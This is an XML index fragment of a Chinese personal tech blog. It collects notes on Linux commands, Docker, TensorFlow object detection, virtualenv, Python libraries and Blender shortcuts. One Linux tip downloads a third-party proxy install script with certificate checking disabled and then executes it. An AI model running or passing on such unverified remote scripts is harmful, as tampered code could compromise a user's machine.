        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux常用命令用法总结]]></title>
    <url>%2F2018%2F11%2F01%2FLinux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[记录一些常用的linux命令用法，以备查询。 校验文件下载的文件最好校验完整性，防止被人篡改。以sha256sum为例： 123456789# 以下命令将生成树莓派映像的sha256哈希码，从树莓派官网复制该映像sha256哈希码，以便校验。# 当然通常应该会提供映像的哈希码校验文件。sha256sum 2018-10-09-raspbian-stretch.zip &gt;2018-10-09-raspbian-stretch.zip.sha256sum# 使用下面校验文件的完整性，如果成功则映像与官方一致，未被篡改。# 注意被校验文件与校验文件应放在同一个目录。sha256sum -c 2018-10-09-raspbian-stretch.zip.sha256sum 转换和复制文件命令Linux的dd命令用于复制文件并对原文件的内容进行转换和格式化处理。1234567891011读指定物理扇区：dd if=&lt;源设备&gt; of=&lt;输出设备或文件&gt; skip=&lt;指定扇区值&gt; bs=512 count=1写指定物理扇区：dd if=&lt;输入设备或文件&gt; of=&lt;输出设备&gt; seek=&lt;指定扇区值&gt; bs=512 count=1读取sd启动扇区示例：dd if=/dev/mmcblk0 of=mbrsd.data bs=512 count=1制作光盘iso镜像dd if=/dev/cdrom of=/home/hch/drone.iso status=progress conv=fsync 查找文件12345# find基本语法：find [PATH] [option] [action]find /usr/lib -name libQt5Xml.so# 使用通配符find /usr/lib -name &quot;*ssl*&quot; 批量转换文件格式1234567# 将png格式图像转换为jpg# -1 – 告诉 ls 每行列出一个图像名称的选项标识# -n – 指定最多参数个数，例子中为 1# -c – 指示 bash 运行给定的命令# $&#123;0%.png&#125;.jpg – 设置新转换的图像文件的名字，% 符号用来删除源文件的扩展名ls -1 *.png | xargs -n 1 bash -c &apos;convert &quot;$0&quot; &quot;$&#123;0%.png&#125;.jpg&quot;&apos; 修改用户12# 将用户$USER添加到dialout用户组，以获取串口访问权限sudo usermod -a -G dialout $USER 特殊符号用法123456789#| 管道 (pipeline)，是 UNIX 系统，基础且重要的观念。连结上个指令的标准输出，做为下个指令的标准输入。who | wc -l#! 惊叹号(negate or reverse)，通常它代表反逻辑的作用，譬如条件侦测中，用 != 来代表&quot;不等于&quot;#下例代表显示除了a0, a1 .... a9 这几个文件的其他文件。ls a[!0-9]#&amp; 后台工作，单一个&amp; 符号，且放在完整指令列的最后端，即表示将该指令列放入后台中工作。tar cvfz data.tar.gz data &gt; /dev/null &amp; 终端下载123456789101112# 逐条下载uri.txt文件中每一行uriwget -i uri.txt# 跳过前1000条再下载awk &apos;NR&gt;=1000&apos; url.txt | wget -i -# install proxywget --no-check-certificate https://raw.githubusercontent.com/jwchenzju/teddysunss/master/shadowsocks.shchmod +x shadowsocks.sh./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log 终端中打开文件管理器12使用gnome文件管理器打开当前文件夹nautilus ./ 统计1234567891011121314151617# 统计文件行数wc -l file统计某文件夹下文件的个数ls -l |grep &quot;^-&quot;|wc -l统计某文件夹下目录的个数ls -l |grep &quot;^ｄ&quot;|wc -l统计文件夹下文件的个数，包括子文件夹里的ls -lR|grep &quot;^-&quot;|wc -l# 统计文件或文件夹大小du -a -h -d 1 ./# 统计文件状态信息stat file.txt 系统服务管理12345# service命令用于对系统服务进行管理，比如启动（start）、停止（stop）、重启（restart）、查看状态（status）等。# service命令本身是一个shell脚本，它在/etc/init.d/目录查找指定的服务脚本，然后调用该服务脚本来完成任务。# 查看系统所有服务状态service --status-all 查询本机公网IP12curl ifconfig.mecurl ipinfo.io 压缩和解压文件1234567# tar命令tar zxvf FileName.tar #解压tar czvf FileName.tar DirName #压缩# zip命令unzip FileName.zip #解压zip -r FileName.zip DirName #压缩 SSH 连接、远程上传下载文件1234567891011# SSH 远程登入 Ubuntu 机 ssh username@192.168.0.1# 将 文件/文件夹 从远程 Ubuntu 机拷至本地(scp) scp -r username@192.168.0.1:/home/username/remotefile.txt remotefile.txt# 将 文件/文件夹 从本地拷至远程 Ubuntu 机(scp) scp -r localfile.txt username@192.168.0.1:/home/username/# rsync大文件断电续传，远程服务器需安装rsyncrsync -P --rsh=ssh root@192.168.0.1:/root/fgdata.tar fgdata.tar 参考链接 初窥Linux 之 我最常用的20条命令,by ljianhui. Linux的五个查找命令,by 阮一峰. shell脚本中一些特殊符号, by 阿笨猫. vultr proxy proxychains配置,by Verne.]]></content>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用tensorflow_object_detection_api训练自定义模型]]></title>
    <url>%2F2018%2F10%2F20%2F%E4%BD%BF%E7%94%A8tensorflow-object-detection-api%E8%AE%AD%E7%BB%83%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[近期研究目标对象检测和识别，发现谷歌开源的基于tensorflow的object detection api模型效果不错，于是git clone下来测试一下。下面记录我在debian linux上安装配置object detection api模型，构建自定义数据集，训练和测试object detection api模型的过程，以及整个过程中遇到的一下问题，需要注意的事项。 准备工作docker安装TensorFlow 程序在 GPU 上的运行速度通常要比在 CPU 上快得多，在系统满足NVIDIA 软件要求的前提下，推荐使用支持 GPU 的 TensorFlow。 官方推荐使用Docker简化TensorFlow的GPU支持配置，这样只需要linux主机安装好Nvidia GPU驱动即可。 安装docker安装docker的方法可参考链接1。 安装nvidia-docker 123456789# Add the package repositoriescurl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -curl -s -L https://nvidia.github.io/nvidia-docker/debian9/nvidia-docker.list | \ sudo tee /etc/apt/sources.list.d/nvidia-docker.listsudo apt-get update# Install nvidia-docker2 and reload the Docker daemon configurationsudo apt-get install -y nvidia-docker2sudo service docker restart 下载最新支持GPU和Python3的tensorflow映像[2] 1docker pull tensorflow/tensorflow:latest-gpu-py3 测试tensorflow映像 12docker run --runtime=nvidia -it --rm tensorflow/tensorflow:latest-gpu-py3 \ python -c &quot;import tensorflow as tf; print(tf.contrib.eager.num_gpus())&quot; 下载TFModel库及其相关库1234# 基于tensorflow的模型和例子git clone https://github.com/tensorflow/models.git# raccoon数据集，可参考其中生成TFRecord格式数据的方法git clone https://github.com/datitran/raccoon_dataset.git 安装Python虚拟环境管理工具1234# 具体安装配置过程参见链接3sudo pip3 install virtualenvsudo pip3 install virtualenvwrappermkvirtualenv object-detection --python=/usr/bin/python3# 创建python3虚拟环境 数据标注以分类几何形状为例，收集相关图片后，需要对它们进行标注。推荐使用 LabelImg 进行标注，生成的文件是 PASCAL VOC 的 xml 格式。这个工具还可以加载标注文件，检查标注结果[3]。123456789git clone https://github.com/tzutalin/labelImg.gitworkon object-detection# 启动python3虚拟环境workon object-detection# 安装配置labelImgsudo apt-get install pyqt5-dev-toolssudo pip3 install -r requirements/requirements-linux-python3.txtmake qt5py3python3 labelImg.py 除了标注图片，还需创建一个 .pbtxt 文件用来说明标注的分类。例如：123456789101112item &#123; id: 1 name: &apos;circle&apos;&#125;item &#123; id: 2 name: &apos;square&apos;&#125;item &#123; id: 3 name: &apos;triangle&apos;&#125; 需要特别注意以下两点： name 不支持直接写中文，需要 UTF-8 编码 id 从 1 开始编号，不能从 0 开始编号。 数据准备标注好的数据是图片文件（.jpg）和标注文件（.xml），而 TensorFlow 不能直接用这些数据作为输入，还需要转成 TFRecord 格式。可采用两种方法生成TFRecord格式数据： tensorflow/models中方法 项目中使用create_pascal_tf_record.py, create_pet_tf_record.py生成TFrecord 格式数据 raccoon_dataset中方法 项目中使用xml_to_csv.py把xml合并成一个CSV文件，使用split labels.ipynb 随机划分训练集和测试集，以及使用generate_tfrecord.py 生成相对应的 TFRecord 训练集和测试集。123456789workon object-detection# 将生成geometry_labels.csvpython xml_to_csv.py# 打开split labels.ipynb生产训练集train_labels.csv和测试集test_labels.csvjupyter notebook# 创建训练用TFRecord文件:python generate_tfrecord.py --csv_input=data/train_labels.csv --output_path=training/geometry_train.record# 创建测试用TFRecord文件:python generate_tfrecord.py --csv_input=data/test_labels.csv --output_path=training/geometry_test.record 第二种方法比较直观，因此我采用第二种方法生产TFRecord数据。 安装配置安装TFModel依赖123456789101112workon object-detection# For CPUpip install tensorflow# For GPUpip install tensorflow-gpupip install --user Cythonpip install --user contextlib2pip install --user pillowpip install --user lxmlpip install --user jupyterpip install --user matplotlib 安装COCO API1234git clone https://github.com/cocodataset/cocoapi.gitcd cocoapi/PythonAPImakecp -r pycocotools &lt;path_to_tensorflow&gt;/models/research/ 编译Protobuf123456# From tensorflow/models/research/wget -O protobuf.zip https://github.com/google/protobuf/releases/download/v3.0.0/protoc-3.0.0-linux-x86_64.zipunzip protobuf.zip# From tensorflow/models/research/./bin/protoc object_detection/protos/*.proto --python_out=. 添加库到PYTHONPATH123# From tensorflow/models/research/# 每次调用TFModel的Object Detection API之前都要设置export PYTHONPATH=$PYTHONPATH:`pwd`:`pwd`/slim 安装测试12# if all tests is ok, the installation is no problem.python object_detection/builders/model_builder_test.py 模型训练数据准备 将label_map文件、训练用TFRecord文件、测试用TFRecord文件复制到tensorflow/models/research/object_detection/data文件夹下。 12345# 推荐的数据目录结构+ data - geometry.pbtxt - geometry_test.record - geometry_train.record 下载COCO预训练模型用于迁移学习 123# From tensorflow/models/research/object-detectionwget http://download.tensorflow.org/models/object_detection/ssd_mobilenet_v1_coco_2018_01_28.tar.gztar -xvf ssd_mobilenet_v1_coco_2018_01_28.tar.gz 修改解压后模型文件夹中pipeline.config 解压ssd_mobilenet_v1_coco_2018_01_28模型后会看到一个 .config 文件，里面包含有模型的参数，训练的参数，评估的参数等。这里需要修改到的有， 模型参数中的 num_classes，改成你的类别数， 训练参数中的 fine_tune_checkpoint，采用迁移学习，这里路径的指向刚才下载的Pre-train模型，比如 ssd_mobilenet_v1_coco_11_06_2017/model.ckpt train_input_reader 下面的 input_path，改成你的训练数据，例如 data/train.record。label_map_path，改成你的 pbtxt 文件路径，例如 data/object.pbtxt eval_input_reader 下面的 input_path，也需要改成你的测试集，例如 data/test.record。同样，label_map_path，也改成你的 pbtxt 文件路径，例如 data/object.pbtxt1234567891011121314151617181920212223242526272829//pipeline.config修改示例model &#123; ssd &#123; num_classes: 3 ... &#125;&#125;train_config &#123; ... fine_tune_checkpoint: &quot;object_detection/ssd_mobilenet_v1_coco_2018_01_28/model.ckpt&quot; from_detection_checkpoint: true num_steps: 50000&#125;train_input_reader &#123; label_map_path: &quot;object_detection/data/geometry.pbtxt&quot; tf_record_input_reader &#123; input_path: &quot;object_detection/data/geometry_train.record&quot; &#125;&#125;eval_input_reader &#123; label_map_path: &quot;object_detection/data/geometry.pbtxt&quot; shuffle: false num_epochs: 1 num_readers: 1 tf_record_input_reader &#123; input_path: &quot;object_detection/data/geometry_test.record&quot; &#125; sample_1_of_n_examples: 1&#125; 训练数据在GPU上训练TFModel，与在CPU上训练TFModel相比，要快五倍左右，因此推荐在GPU上训练TFModel。 启动docker 12# 启动docker，并使用-v参数将目录/home/$USER挂载到容器上docker run --runtime=nvidia -v /home/$USER:/home/$USER -it tensorflow/tensorflow:latest-gpu-py3 bash 执行训练 1234# From tensorflow/models/research/export PYTHONPATH=$PYTHONPATH:`pwd`:`pwd`/slim# 开始训练python object_detection/model_main.py --pipeline_config_path=object_detection/ssd_mobilenet_v1_coco_2018_01_28/pipeline.config --model_dir=object_detection/ssd_mobilenet_v1_coco_2018_01_28/saved_model/ --num_train_steps=50000 --alsologtostderr 使用tensorboard查看训练进度 12# From tensorflow/models/research/tensorboard --logdir=object_detection/ssd_mobilenet_v1_coco_2018_01_28/saved_model/ 在CPU上训练只需执行第二步和第三步。 导出模型12# From tensorflow/models/research/python object_detection/export_inference_graph.py --input_type=image_tensor --pipeline_config_path=object_detection/ssd_mobilenet_v1_coco_2018_01_28/pipeline.config --trained_checkpoint_prefix=object_detection/ssd_mobilenet_v1_coco_2018_01_28/saved_model/model.ckpt-50000 --output_directory=../../../../ssd_mobilenet_v1_coco_2018_01_28 运行完命令后模型就导出到 ssd_mobilenet_v1_coco_2018_01_28 文件夹中，其中的frozen_inference_graph.pb即是所需模型。 需要注意的是，参数中的 –trained_checkpoint_prefix 是需要指定到单个模型的，例如 model.ckpt-50000，这个50000就是训练了 50000 步后自动保存模型。 参考文献 https://huangwang.github.io/2018/10/18/Debian-Linux下安装Docker的方法/， by jack huang https://www.tensorflow.org/install/docker?hl=zh-cn , by tensorflow. https://huangwang.github.io/2018/10/09/Virtualenv简易教程/ , by jack huang https://laddiexu.github.io/tech/2017/11/04/TF-ODYourData.html , by 菁菁者莪 https://blog.csdn.net/xunan003/article/details/78720189?utm_source=blogxgwz2, by xunan003]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker使用帮助]]></title>
    <url>%2F2018%2F10%2F19%2FDocker%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9%2F</url>
    <content type="text"><![CDATA[Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。 Docker与传统虚拟机如virtualbox、vmware相比，占用资源少，更加轻便，启动快，更适用于解决软件环境配置难题。 基本概念 镜像 Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。 容器 镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的 类 和 实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。 仓库 镜像构建完成后，可以很容易的在当前宿主机上运行，但是，如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry 就是这样的服务。 一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。 通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 &lt;仓库名&gt;:&lt;标签&gt; 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签。 使用方法操作镜像获取镜像Docker Hub 上有大量的高质量的镜像可以用，使用docker pull命令拉取镜像。1234// 拉取镜像$ docker pull ubuntu:16.04// 以该镜像启动容器$ docker run -it --rm ubuntu:16.04 bash docker run 就是运行容器的命令,其参数含义如下： -it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。 —rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。 ubuntu:16.04：这是指用 ubuntu:16.04 镜像为基础来启动容器。 bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 bash。 列出镜像1docker image ls 删除镜像删除本地镜像格式如下：1docker image rm [选项] &lt;镜像1&gt; [&lt;镜像2&gt; ...] 以删除hello-world镜像为例：1docker image rm hello-world 操作容器启动容器1234// 新建并启动容器docker run ubuntu:14.04 /bin/echo &apos;Hello world&apos;// 启动已终止容器docker container start 后台运行1234567// 后台运行容器$ docker run -d ubuntu:17.10 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;// 通过 docker container ls 命令来查看容器信息$ docker container ls// 通过 docker container logs 命令获取容器的输出信息$ docker container logs [container ID or NAMES] 终止容器1docker container stop 进入容器在使用 -d 参数时，容器启动后会进入后台。 某些时候需要进入容器进行操作，包括使用 docker attach 命令或 docker exec 命令，推荐大家使用 docker exec 命令。1234$ docker run -dit ubuntu$ docker container ls$ docker exec -i 69d1 bash$ docker exec -it 69d1 bash 如果从这个 stdin 中 exit，不会导致容器的停止。这就是为什么推荐大家使用 docker exec 的原因。 删除容器12345// 删除一个处于终止状态的容器$ docker container rm trusting_newton// 清理所有处于终止状态的容器docker container prune 参考文献 https://yeasy.gitbooks.io/docker_practice/introduction/what.html http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html ，by 阮一峰 https://zh.wikipedia.org/wiki/Docker ,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debian_Linux下安装Docker的方法]]></title>
    <url>%2F2018%2F10%2F18%2FDebian-Linux%E4%B8%8B%E5%AE%89%E8%A3%85Docker%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。 Docker利用Linux核心中的资源分离机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免启动一个虚拟机造成的额外负担。Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网上、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、存储器、block I/O与网上。 下面即记录在Debian Linux下按照Docker社区版的方法。 前期准备添加Docker的pgp key。1curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - 配置Docker的Apt仓库。1echo &apos;deb https://download.docker.com/linux/debian stretch stable&apos; | sudo tee /etc/apt/sources.list.d/docker.list 更新Apt仓库1sudo apt-get update 安装Docker123456// 清除之前安装的Docker版本apt-get remove docker docker-engine docker.io// 在安装最新的Docker社区版apt-get install docker-ce// 测试dockerdocker run hello-world 以非root用户管理docker12sudo groupadd dockersudo usermod -aG docker $USER 参考文献 https://zh.wikipedia.org/wiki/Docker ,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tensorflow学习笔记]]></title>
    <url>%2F2018%2F10%2F14%2Ftensorflow%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[TensorFlow™ 是一个开放源代码软件库，用于进行高性能数值计算。借助其灵活的架构，用户可以轻松地将计算工作部署到多种平台（CPU、GPU、TPU）和设备（桌面设备、服务器集群、移动设备、边缘设备等）。TensorFlow™ 最初是由 Google Brain 团队（隶属于 Google 的 AI 部门）中的研究人员和工程师开发的，可为机器学习和深度学习提供强力支持，并且其灵活的数值计算核心广泛应用于许多其他科学领域。 tensorflow入门tensorflow实现机器学习的基本步骤如下： 定义模型，建立数据流图 定义loss，并指定优化器 传入数据并进行训练 使用测试集进行评测 通用代码框架1234567891011121314151617181920212223242526272829303132333435363738394041424344import tensorflow as tf# 初始化变量和模型参数，定义训练闭环中的运算def inference(X): # 计算推断模型在数据X上的输出，并将结果返回def loss(X,Y): # 依据训练数据X及其期望输出Y计算损失def inputs(): # 读取或生成训练数据X及其期望输出Ydef train(total_loss): # 依据计算的总损失训练或调整模型参数def evaluate(sess,X,Y): # 对训练得到的模型进行评估# 在一个会话对象中启动数据流图，搭建流程with tf.Session() as sess: tf.initialize_all_variables().run() X,Y=inputs() total_loss=loss(X,Y) train_op=train(total_loss) coord=tf.train.Coordinator() threads=tf.train.start_queue_runners(sess=sess,coord=coord) # 实际的训练迭代次数 training_steps=1000 for step in range(training_steps): sess.run([train_op]) # 出于调试和学习的目的，查看损失在训练过程中递减的情况 if step % 10 =0: print &quot;loss: &quot;,sess.run([total_loss]) evaluate(sess,X,Y) coord.request_stop() coord.join(threads) sess.close() 保存训练检查点借助tf.train.Saver类可创建检查点文件，将数据流图中变量保存至其中。修改后框架如下：1234567891011121314151617181920# 模型定义代码# 创建一个Saver对象saver=tf.train.Saver()# 在会话对象中启动数据流图，搭建流程with tf.Session() as sess: # 模型设置 # 实际的训练闭环 for step in range(training_steps): sess.run([train_op]) if step % 1000 ==0 # 将创建遵循命名模板为my-model-&#123;step&#125;的检查点文件，默认保存最近的5个文件 saver.save(sess,&apos;my-model&apos;,global_step=step) # 模型评估 saver.save(sess,&apos;my-model&apos;,global_step=training_steps) sess.close() 如果希望从检查点恢复，则使用tf.train.get_checkpoint_state方法验证检查点文件的存在，并使用tf.train.Saver.restore方法恢复变量值。123456789101112131415with tf.Session() as sess: # 模型设置 initial_step=0 # 验证之前是否已经保存了检查点文件 ckpt=tf.train.get_checkpoint_state(os.path.dirname(__file__)) if ckpt and ckpt.model_checkpoint_path: # 从检查点恢复模型参数 saver.restore(sess,ckpt.model_checkpoint_path) initial_step=int(ckpt.model_checkpoint_path.rsplite(&apos;_&apos;,1)[1]) # 实际的训练闭环 for step in range(initial_step, training_steps): ... 参考文献 https://www.tensorflow.org/?hl=zh-cn . 面向机器智能的TensorFlow实践, by Sam Abrahams, Danijar Hafner,etc.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python常用库简介]]></title>
    <url>%2F2018%2F10%2F14%2FPython%E5%B8%B8%E7%94%A8%E5%BA%93%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Python的高效开发建立在大量常用库基础上，因此掌握常用的Python库十分必要。下面简单介绍Python的各类常用库。 常用标准库 os： 访问操作系统功能模块 sys： 访问一些环境变量和与 Python 解释器交互 datetime： 日期时间处理 collections： 高级数据结构，有序字典，队列等等 uuid： 生成 UUID 模块 random： 随机数生成模块 re： 正则表达式模块 json： JSON 处理模块 pdb： 单步调试模块 科学计算 scipy：基于Python的matlab实现，旨在实现matlab的所有功能。包含Numpy、Ipython、Pandas、Matplotlib、Sympy等常用库 numpy： 基于Python的科学计算第三方库，提供了矩阵，线性代数，傅立叶变换等等的解决方案 pandas： 支持表格等多维数据 matplotlib： 用Python实现的类matlab的第三方库，用以绘制一些高质量的数学二维图形 命令交互 ipython： 交互命令行，适合科学计算 jupyter： ipython notebook 的延伸，可以直接放在github上 argparse：(Python 标准库)用于命令项选项与参数解析的模块 爬虫相关 urllib: (Python 标准库)，接受URL请求的相关模块 http: (Python 标准库)，处理所有客户端—服务器http请求的具体细节 requests: 第三方库，人性化的HTTP请求库，比urllib更好用 pillow: 处理验证码 rsa: 处理加密问题 BeautifulSoup：解析html文档为用户提供需要抓取的数据 lxml: 是基于 libxml2 这一 XML 解析库的 Python 封装,解析速度比 Beautiful Soup 更快 环境管理 virtualenv：创建独立 Python 环境的工具 virtualenvwrapper：virtualenv 的一组扩展 包管理 pip：Python 包和依赖关系管理工具 conda：跨平台，Python 二进制包管理工具 并发和并行 threading：(Python 标准库)更高层的线程接口 multiprocessing：(Python 标准库) 基于进程的“线程”接口 日志 logging：(Python 标准库) 为 Python 提供日志功能。 兼容性 six：Python 2 和 3 的兼容性工具 计算机视觉 opencv 机器学习 tensorflow 参考文献 Python 笔记四：Python的常用库收集, by brandonxiang]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Virtualenv简易教程]]></title>
    <url>%2F2018%2F10%2F09%2FVirtualenv%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[virtualenv是一个创建隔离python环境的工具，主要用于解决包冲突问题。 安装方法1sudo pip3 install virtualenv 使用方法创建项目的虚拟环境12$ cd my_project_folder$ virtualenv venv #venv是虚拟环境名称 执行上述命令后，将生成一个与虚拟环境同名的文件夹，包含 Python 可执行文件和 pip 库的拷贝，可用于安装其他包。 但是默认情况下，虚拟环境中不会包含也无法使用系统环境的global site-packages。比如系统环境里安装了 requests 模块，在虚拟环境里import requests会提示ImportError。如果想使用系统环境的第三方软件包，可以在创建虚拟环境时使用参数–system-site-packages。如下所示：1virtualenv --system-site-packages venv 此外可以指定虚拟环境所使用的 Python 版本，但前提是系统中已经安装了该版本：1virtualenv -p /usr/bin/python2.7 venv 使用虚拟环境启动虚拟环境：123cd venvsource bin/activate python -V 退出虚拟环境：1deactivate virtualenvwrappervirtualenvwrapper是virtualenv 的扩展工具，提供了一系列命令行命令，可以方便地创建、删除、复制、切换不同的虚拟环境。同时，使用该扩展后，所有虚拟环境都会被放置在同一个目录下。 安装方法1pip3 install virtualenvwrapper 环境配置在$home/.bashrc文件中添加如下几行代码：12345# bash -f file检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 trueif [ -f /usr/local/bin/virtualenvwrapper.sh ]; then export WORKON_HOME=$HOME/.virtualenvs source /usr/local/bin/virtualenvwrapper.shfi 使用方法mkvirtualenv 也可以使用 virtualenv 的参数，比如 –python 来指定 Python 版本。123456789101112131415mkvirtualenv venv # 创建虚拟环境，虚拟环境目录都在 WORKON_HOME 里lsvirtualenv -b # 列出虚拟环境workon [虚拟环境名称] # 切换虚拟环境lssitepackages # 查看环境里安装了哪些包cdvirtualenv [子目录名] # 进入当前环境的目录cpvirtualenv [source] [dest] # 复制虚拟环境deactivate # 退出虚拟环境rmvirtualenv [虚拟环境名称] # 删除虚拟环境 conda vs. pip vs. virtualenvConda是一个开源包管理系统和环境管理系统，用于安装多个版本的软件包及其依赖关系，并在它们之间轻松切换。 它适用于Linux，OS X和Windows，是为Python程序创建的，但可以打包和分发任何软件。 Pip是一个以Python计算机程序语言写成的软件包管理系统，用于安装和管理软件包。 它们直接的区别如下： pip使用方法1234# 导出python安装包环境pip freeze &gt; requirements.txt# 导入requirements文件pip install -r requirements.txt 参考文献 http://codingpy.com/article/virtualenv-must-have-tool-for-python-development/. https://conda.io/docs/commands.html#conda-vs-pip-vs-virtualenv-commands.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Blender简易教程]]></title>
    <url>%2F2018%2F09%2F19%2FBlender%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[最近需要用Blender建3D模型，试用了半天，将经验简单总结一下。 3D建模流程 建立3D模型：通常在Blender的3D视图窗口对物体进行建模。 拆分制作纹理：设置缝合边，再展开。打开U/V图像编辑器窗口即可看到拆分效果。导出图片后制作纹理。 使用材质贴图：设置材质着色，添加纹理。 Blender快捷键Blender快捷键很多，熟练使用可加速3D模型的建立。 3D视图窗口字母键 A：全选、取消选择 Shift+A：增加物件，新建的物件会出现在准星的位置 B：框选，加Shift取消选择，按Esc退出选择 C：刷选，加Shift取消选择，按Esc退出选择 Shift+C：将游标设置到坐标系中心 Ctrl+Shift+C：为骨头添加约束 Shift+D：复制对象 E：挤出选中对象 Shift+E：编辑模式下，打开对称镜像挤出骨架 F：编辑模式下，在点的基础上构建边或面；在权重绘制模式下，设置笔刷大小 G：移动选中对象 Alt+G: 在Pose Mode下，按“Alt+G”骨架归位 H：隐藏对象（Hide） Alt+H：显示对象 I：增加关键帧 Shift+I：在Pose Mode下，选中骨架，再按“Shift+I”插入反关节 Ctrl+J: 在Pose Mode下，连接两个独立的骨架，以便在编辑模式下同时编辑；在Object Mode下，选择两个物件后合并 K: 切割,按“enter”键完成切割。按“k”键接着按住“ctrl”键移动到线框上可以自动定位到线的二分之一处。按“k”键接着按一下“c”键可以水平垂直或者45度进行切割。按“k”键接着按一下“z”键可以对物体一圈进行切割。 Ctrl+L：编辑模式下，选择一个点，在Ctrl+L将选择与点相连的连续表面 M：选中物体，按“M”键，再选择要将物体放置的图层。 N：打开物体属性 Ctrl+P：编辑模式下，设置多个骨头的父骨头；或者物体模式下，设置多个物体的父级。 Alt+P：物体模式下，取消物体的父子关系。 R: 旋转 Alt+R: 在Pose Mode下，按“Alt+R”骨架归位 Ctrl+R: 环切并滑动 S: 缩放 S+XYZ：沿XYZ轴方向缩放 Alt+S：法向缩放 T：打开左侧工具栏 U：编辑模式下按“U”，打开UV映射菜单,选择活动面再全选，然后UV展开 Ctrl+U:存储为启动文件 W：快捷拓展命令栏 X：删除 Z：线框模式与实体模式之间切换 Shift+Z：视口着色切换到实时渲染模式 ]：在Pose模式下，选择主骨头，再按“]”可直接选择下一根骨头 Shift+]：在Pose模式下，选择主骨头，再按“Shift+]”可直接选择下一根骨头 Ctrl+Space：调出三维坐标系操纵物体 Ctrl+Tab：进行点、线、面的编辑模式 Ctrl+Alt+Q：切换四视图 Ctrl+向上箭头：最大化对应视图 Shift+空格键：放大视图 Tab：编辑模式和物体模式切换 功能键 F12：计算结果（算图模式），如果是黑色的，需要把摄像机和光源放在同一个图层中，或者选择摄像机和光源的图层。 数字键数字键主要用于视角切换 1：前视图 3：侧视图 5：正交与透视之间切换 7：俯视图 鼠标键 右键：选择物体 shift+中键：平移 滚轴/（Ctrl+中键拖拽）：缩放 参考文献 Blender常用快捷键,by JinunMeng. 如何系统的学习blender？,by zhihu. 贴图、纹理、材质的区别是什么？,by zhihu. 材质、贴图、纹理的区别,by MATU. 材质和纹理的区别,by zhuyong006. 一文看懂材质/纹理 Material, Texture, Shading, Shader 的区别,by kidult00.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下将cmd命令添加到右键菜单]]></title>
    <url>%2F2018%2F09%2F11%2FWindows%E4%B8%8B%E5%B0%86cmd%E5%91%BD%E4%BB%A4%E6%B7%BB%E5%8A%A0%E5%88%B0%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%2F</url>
